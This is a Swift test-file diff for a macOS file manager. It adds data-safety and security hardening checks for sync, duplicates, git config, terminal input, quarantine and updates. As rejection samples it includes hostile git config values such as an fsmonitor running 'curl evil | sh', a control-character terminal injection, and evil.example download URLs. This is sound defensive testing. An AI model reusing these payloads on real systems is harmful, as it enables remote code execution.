@@ -745,13 +745,18 @@ enum FlowFileVerificationSuite {
             try expect(FileManager.default.fileExists(atPath: rightDir.appendingPathComponent("Sub/only_left.txt").path))
             try expect(FileManager.default.fileExists(atPath: leftDir.appendingPathComponent("only_right.txt").path))
 
-            // Mirror mode removes extra file in right
+            // Mirror mode removes extra file in right (using isolated fake Trash so tests never touch ~/.Trash)
+            let fakeTrash = tempDir.appendingPathComponent("FakeTrash", isDirectory: true)
+            try FileManager.default.createDirectory(at: fakeTrash, withIntermediateDirectories: true)
             let extraInRight = rightDir.appendingPathComponent("stale_extra.txt")
             try Data("stale".utf8).write(to: extraInRight)
             let mirrorPlan = try FolderSyncService.buildPlanSync(leftRoot: leftDir, rightRoot: rightDir, mode: .mirrorLeftToRight)
             try expect(mirrorPlan.count == 1 && mirrorPlan[0].operation == .trashInRight)
-            _ = try FolderSyncService.execute(plan: mirrorPlan)
+            _ = try FolderSyncService.execute(plan: mirrorPlan) { url in
+                try FileManager.default.moveItem(at: url, to: fakeTrash.appendingPathComponent(url.lastPathComponent))
+            }
             try expect(!FileManager.default.fileExists(atPath: extraInRight.path))
+            try expect(FileManager.default.fileExists(atPath: fakeTrash.appendingPathComponent("stale_extra.txt").path))
 
             // QuickFileToolsService: Generate a 400x300 PNG, convert/resize to JPEG, merge 2 images to PDF, and verify SHA-256
             let toolsDir = tempDir.appendingPathComponent("QuickTools", isDirectory: true)
@@ -836,6 +841,170 @@ enum FlowFileVerificationSuite {
         try await colorTagsAndWorkspaceSessionPersistence()
         try await deepSearchFlatViewDiskSpaceAndDuplicates()
         try await folderSyncAndQuickFileTools()
+        try await safetyAndSecurityHardening()
+    }
+
+    // MARK: - 17: v1.1.1 Data-safety & security hardening
+
+    static func safetyAndSecurityHardening() async throws {
+        try await withTempDir { tempDir in
+            let fm = FileManager.default
+
+            // C1: Mirror mode must refuse when the left folder can't be read (never plan "trash everything")
+            let right = tempDir.appendingPathComponent("Backup", isDirectory: true)
+            try fm.createDirectory(at: right, withIntermediateDirectories: true)
+            try Data("viktig".utf8).write(to: right.appendingPathComponent("viktig.txt"))
+            let missingLeft = tempDir.appendingPathComponent("FrakobletDisk", isDirectory: true)
+            try expectThrows("Unreadable left must abort mirror planning") {
+                _ = try FolderSyncService.buildPlanSync(leftRoot: missingLeft, rightRoot: right, mode: .mirrorLeftToRight)
+            }
+
+            // C1: Empty left in mirror mode must refuse too
+            let emptyLeft = tempDir.appendingPathComponent("TomKilde", isDirectory: true)
+            try fm.createDirectory(at: emptyLeft, withIntermediateDirectories: true)
+            try expectThrows("Empty left must abort mirror planning") {
+                _ = try FolderSyncService.buildPlanSync(leftRoot: emptyLeft, rightRoot: right, mode: .mirrorLeftToRight)
+            }
+            // ...but non-destructive update mode with an empty left is fine
+            let emptyPlan = try FolderSyncService.buildPlanSync(leftRoot: emptyLeft, rightRoot: right, mode: .updateLeftToRight)
+            try expect(emptyPlan.isEmpty)
+
+            // C1: Unreadable subfolder inside left aborts the plan
+            let leftWithLockedSub = tempDir.appendingPathComponent("KildeMedLåst", isDirectory: true)
+            let lockedSub = leftWithLockedSub.appendingPathComponent("Låst", isDirectory: true)
+            try fm.createDirectory(at: lockedSub, withIntermediateDirectories: true)
+            try Data("a".utf8).write(to: leftWithLockedSub.appendingPathComponent("a.txt"))
+            try fm.setAttributes([.posixPermissions: 0o000], ofItemAtPath: lockedSub.path)
+            defer { try? fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: lockedSub.path) }
+            if !fm.isReadableFile(atPath: lockedSub.path) {
+                try expectThrows("Unreadable subfolder must abort planning") {
+                    _ = try FolderSyncService.buildPlanSync(leftRoot: leftWithLockedSub, rightRoot: right, mode: .mirrorLeftToRight)
+                }
+            }
+            try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: lockedSub.path)
+
+            // H8: Nested detection is case-insensitive and symlink-aware
+            let nestedViaCase = URL(fileURLWithPath: right.path.replacingOccurrences(of: "/Backup", with: "/backup"))
+                .appendingPathComponent("Sub", isDirectory: true)
+            try fm.createDirectory(at: right.appendingPathComponent("Sub"), withIntermediateDirectories: true)
+            try expect(FolderSyncService.isSameOrInside(nestedViaCase, right))
+            let linkToRight = tempDir.appendingPathComponent("LenkeTilBackup")
+            try fm.createSymbolicLink(at: linkToRight, withDestinationURL: right)
+            try expectThrows("Symlinked same folder must be rejected") {
+                _ = try FolderSyncService.buildPlanSync(leftRoot: linkToRight, rightRoot: right, mode: .updateLeftToRight)
+            }
+
+            // C2: When Trash is unavailable (e.g. exFAT USB/SMB), sync must refuse rather than delete permanently
+            let srcDir = tempDir.appendingPathComponent("Src", isDirectory: true)
+            let dstDir = tempDir.appendingPathComponent("Dst", isDirectory: true)
+            let fakeTrash = tempDir.appendingPathComponent("SyncTrash", isDirectory: true)
+            try fm.createDirectory(at: srcDir, withIntermediateDirectories: true)
+            try fm.createDirectory(at: dstDir, withIntermediateDirectories: true)
+            try fm.createDirectory(at: fakeTrash, withIntermediateDirectories: true)
+            let dstFile = dstDir.appendingPathComponent("doc.txt")
+            try Data("gammel".utf8).write(to: dstFile)
+            try fm.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7200)], ofItemAtPath: dstFile.path)
+            try Data("ny versjon".utf8).write(to: srcDir.appendingPathComponent("doc.txt"))
+            let overwritePlan = try FolderSyncService.buildPlanSync(leftRoot: srcDir, rightRoot: dstDir, mode: .updateLeftToRight)
+            try expect(overwritePlan.count == 1)
+            try expectThrows("Unavailable Trash must abort without permanent deletion") {
+                _ = try FolderSyncService.execute(plan: overwritePlan) { _ in
+                    throw NSError(domain: NSCocoaErrorDomain, code: NSFeatureUnsupportedError)
+                }
+            }
+            try expect(String(data: try Data(contentsOf: dstFile), encoding: .utf8) == "gammel", "Original file must survive when Trash fails")
+            let leftoversAfterFail = try fm.contentsOfDirectory(atPath: dstDir.path).filter { $0.hasPrefix(".flowfile-sync-") }
+            try expect(leftoversAfterFail.isEmpty, "Temp sibling must be cleaned up on failure")
+
+            // H9: Overwrite keeps a working file (temp copy + atomic move), old version goes to Trash
+            _ = try FolderSyncService.execute(plan: overwritePlan) { url in
+                try fm.moveItem(at: url, to: fakeTrash.appendingPathComponent(url.lastPathComponent))
+            }
+            try expect(String(data: try Data(contentsOf: dstFile), encoding: .utf8) == "ny versjon")
+            try expect(fm.fileExists(atPath: fakeTrash.appendingPathComponent("doc.txt").path))
+            let leftovers = try fm.contentsOfDirectory(atPath: dstDir.path).filter { $0.hasPrefix(".flowfile-sync-") }
+            try expect(leftovers.isEmpty, "No temp files may be left behind")
+
+            // C3: The same physical file reached via two roots (symlink) is never its own duplicate
+            let photos = tempDir.appendingPathComponent("Bilder", isDirectory: true)
+            try fm.createDirectory(at: photos, withIntermediateDirectories: true)
+            try Data(repeating: 0x5A, count: 5000).write(to: photos.appendingPathComponent("eneste.jpg"))
+            let photosAlias = tempDir.appendingPathComponent("BilderLenke")
+            try fm.createSymbolicLink(at: photosAlias, withDestinationURL: photos)
+            let selfDupGroups = DuplicateFinderService.scanSync(inRoots: [photos, photosAlias])
+            try expect(selfDupGroups.isEmpty, "A single file reached via two paths must not be reported as duplicate")
+            // Hardlinks are the same data and must not be offered for deletion either
+            try fm.linkItem(at: photos.appendingPathComponent("eneste.jpg"), to: photos.appendingPathComponent("hardlink.jpg"))
+            try expect(DuplicateFinderService.scanSync(inRoots: [photos]).isEmpty)
+
+            // H7: Disk analyzer protects home and system folders
+            let home = fm.homeDirectoryForCurrentUser
+            try expect(DiskSpaceSheetView.isProtected(home))
+            try expect(DiskSpaceSheetView.isProtected(home.appendingPathComponent("Documents")))
+            try expect(DiskSpaceSheetView.isProtected(URL(fileURLWithPath: "/System")))
+            try expect(!DiskSpaceSheetView.isProtected(photos))
+
+            // S1: Untrusted git config detection
+            try expect(GitStatusService.isGitConfigTextSafe("[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.com/x.git\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[core]\n\tfsmonitor = \"sh -c 'curl evil | sh'\"\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[core] fsmonitor=/tmp/x\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[filter \"lfs\"]\n\tclean = evil %f\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[include]\n\tpath = /tmp/evil.cfg\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[includeIf \"gitdir:~/\"]\n\tpath = x\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[diff \"img\"]\n\ttextconv = evil\n"))
+            try expect(!GitStatusService.isGitConfigTextSafe("[core]\n\tsshCommand = evil\n"))
+            let evilRepo = tempDir.appendingPathComponent("evilrepo", isDirectory: true)
+            try fm.createDirectory(at: evilRepo.appendingPathComponent(".git"), withIntermediateDirectories: true)
+            try Data("[core]\n\tfsmonitor = touch /tmp/pwned\n".utf8).write(to: evilRepo.appendingPathComponent(".git/config"))
+            try expect(!GitStatusService.isRepositoryConfigSafe(repoRoot: evilRepo))
+            let env = GitStatusService.hardenedGitEnvironment()
+            try expect(env["GIT_CONFIG_NOSYSTEM"] == "1" && env["GIT_CONFIG_GLOBAL"] == "/dev/null")
+
+            // S5: Terminal auto-cd refuses control characters
+            try expect(TerminalSession.isSafeToTypeIntoTerminal("/tmp/Prosjekt æøå (2026)"))
+            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{15}curl evil|sh\n"))
+            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{1B}[31m"))
+            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{85}b"))
+
+            // S3: Quarantine is propagated from archive to extracted content
+            let fakeArchive = tempDir.appendingPathComponent("lastet-ned.zip")
+            try Data("PK".utf8).write(to: fakeArchive)
+            let qValue = "0081;\(String(Int(Date().timeIntervalSince1970), radix: 16));Safari;"
+            _ = qValue.withCString { ptr in
+                setxattr(fakeArchive.path, QuarantineService.attributeName, ptr, strlen(ptr), 0, 0)
+            }
+            let extractedDir = tempDir.appendingPathComponent("utpakket", isDirectory: true)
+            try fm.createDirectory(at: extractedDir.appendingPathComponent("Inner.app/Contents"), withIntermediateDirectories: true)
+            let script = extractedDir.appendingPathComponent("installer.command")
+            try Data("#!/bin/sh\necho hi\n".utf8).write(to: script)
+            if QuarantineService.isQuarantined(fakeArchive) {
+                QuarantineService.propagate(from: fakeArchive, to: [extractedDir])
+                try expect(QuarantineService.isQuarantined(extractedDir))
+                try expect(QuarantineService.isQuarantined(script))
+                try expect(QuarantineService.isQuarantined(extractedDir.appendingPathComponent("Inner.app/Contents")))
+            }
+            try expect(QuarantineService.isPotentiallyExecutable(script))
+            try expect(QuarantineService.isPotentiallyExecutable(extractedDir.appendingPathComponent("Inner.app")))
+            try expect(!QuarantineService.isPotentiallyExecutable(photos.appendingPathComponent("eneste.jpg")))
+
+            // S6: Update source pinned to GitHub slugs and GitHub-hosted assets
+            try expect(UpdateService.isValidRepoSlug("nordiccraft/FlowFile"))
+            try expect(!UpdateService.isValidRepoSlug("https://evil.example/rel.json"))
+            try expect(!UpdateService.isValidRepoSlug("a/b/c"))
+            try expect(UpdateService.isTrustedAssetURL(URL(string: "https://github.com/nordiccraft/FlowFile/releases/download/v1.1.1/FlowFile-Update.zip")!))
+            try expect(!UpdateService.isTrustedAssetURL(URL(string: "https://evil.example/FlowFile-Update.zip")!))
+            try expect(!UpdateService.isTrustedAssetURL(URL(string: "http://github.com/x.zip")!))
+            let payload: [String: Any] = [
+                "tag_name": "v9.9.9",
+                "assets": [
+                    ["name": "Evil.zip", "browser_download_url": "https://evil.example/Evil.zip"],
+                    ["name": "FlowFile-Update.zip", "browser_download_url": "https://github.com/nordiccraft/FlowFile/releases/download/v9.9.9/FlowFile-Update.zip"]
+                ]
+            ]
+            let parsed = try UpdateService.parseReleasePayload(data: try JSONSerialization.data(withJSONObject: payload))
+            try expect(parsed.zipDownloadURL?.host == "github.com")
+            try expect(UpdateService.updateLogURL.path.contains("/Library/Logs/FlowFile/"))
+        }
     }
 }
 
@@ -906,13 +1075,17 @@ final class FlowFileTests: XCTestCase {
     func testFolderSyncAndQuickFileTools() async throws {
         try await FlowFileVerificationSuite.folderSyncAndQuickFileTools()
     }
+
+    func testSafetyAndSecurityHardening() async throws {
+        try await FlowFileVerificationSuite.safetyAndSecurityHardening()
+    }
 }
 #else
 @main
 struct LocalCLTTestRunner {
     static func main() async throws {
         try await FlowFileVerificationSuite.runAll()
-        print("ALL 16 FLOWFILE TEST SUITES PASSED")
+        print("ALL 17 FLOWFILE TEST SUITES PASSED")
     }
 }
 #endif
